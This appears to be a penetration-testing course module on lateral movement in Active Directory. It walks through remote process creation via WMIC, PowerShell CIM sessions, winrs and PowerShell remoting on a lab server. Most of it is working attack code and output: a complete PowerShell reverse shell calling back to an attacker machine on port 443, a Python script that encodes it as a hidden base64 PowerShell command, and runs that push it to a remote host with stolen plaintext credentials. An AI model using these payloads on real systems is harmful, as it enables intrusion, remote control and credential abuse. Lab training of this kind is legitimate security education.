# Lateral Movement in Active Directory

### WMIC & WinRM

We'll instruct wmic to launch a calculator, "calc" instance with the process call create keywords. It is important to note, that the machine we are attacking is a server with the hostname Files04. We are attemping to move laterally from our current machine, to this new server.

We can test the command by connecting as jeff on CLIENT74.

```bash
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```

The WMI job returned the PID of the newly created process and a return value of "0", meaning that the process has been created successfully.

Translating this attack into PowerShell syntax requires a few extra details.

First, We need to create a PSCredential object that will store our session username and password.

To do that, we will first store the username and password in variables. Then, we will secure the password via the ConvertTo-SecureString cmdlet. Finally, we'll create a new PSCredential object with the username variable and secureString object.
```bash
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

Now that we have our PSCredential object, we need to create a Common Information Model (CIM) via the New-CimSession cmdlet.

To do that, we'll first specify DCOM as the protocol for the WMI session with the New-CimSessionOption cmdlet on the first line. On the second line, we'll create the new session, New-Cimsession against our target IP, using -ComputerName and supply the PSCredential object (-Credential $credential) along with the session options (-SessionOption $Options). Lastly, we'll define 'calc' as the payload to be executed by WMI.

```bash
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
```

As a final step, we need to tie together all the arguments we configured previously by issuing the Invoke-CimMethod cmdlet and supplying Win32_Process to the ClassName and Create to the MethodName. To send the argument, we wrap them in @{CommandLine =$Command}.

```bash
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

To simulate the technique, we can connect to CLIENT74 as jeff and insert the above code in a PowerShell prompt. (Not all the code is shown below.)

```bash
PS C:\Users\jeff> $username = 'jen';
...
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```

Verifying the active processes on the target machine reveals that a new calculator process has been launched, confirming that our attack has succeeded.

To further improve our craft, let's replace the previous payload with a full reverse shell written in PowerShell.

First, we'll encode the PowerShell reverse shell so we don't need to escape any special characters when inserting it as a WMI payload.

The following Python code encodes the PowerShell reverse shell to base64 contained in the payload variable and then prints the result to standard output.

Reviewing the entire PowerShell payload is outside the scope of this Module.

We need to replace the highlighted IP and port with the ones of our attacker Kali machine.

```bash
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.244",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Once we have saved the Python script, we can run it and retrieve the output to use later.

```bash
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

After setting up a Netcat listener on port 443 on our Kali machine, we can move on to client74 and run the PowerShell WMI script with the newly generated encoded reverse shell payload.

```bash
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3948           0 192.168.50.73
```

From the output, we can conclude that the process creation has been successful, and switch to our listener for a final confirmation.

Nice! We indeed managed to move laterally and gain privileges as the jen domain user on an internal server by abusing WMI features.

As an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell). Note that for WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

The winrs utility can be invoked by specifying the target host through the -r: argument and the username with -u: and password with -p. As a final argument, we want to specify the commands to be executed on the remote host. For example, we want to run the hostname and whoami commands to prove that they are running on the remote target.

Since winrs only works for domain users, we'll execute the whole command once we've logged in as jeff on CLIENT74 and provide jen's credentials as command arguments.

```bash
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```

The output confirms that we have indeed executed the commands remotely on FILES04.

To convert this technique into a full lateral movement scenario, we just need to replace the previous commands with the base64 encoded reverse-shell we wrote earlier.

```bash
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

PowerShell also has WinRM built-in capabilities called PowerShell remoting, which can be invoked via the New-PSSession cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously.

```bash
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
```

To interact with the session ID 1 we created, we can issue the Enter-PSSession cmdlet followed by the session ID.

```bash
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

---

#### Permissions Mapped to Remote Execution tool

Administrators -> psexec || sc 
Remote Management Users -> winrm

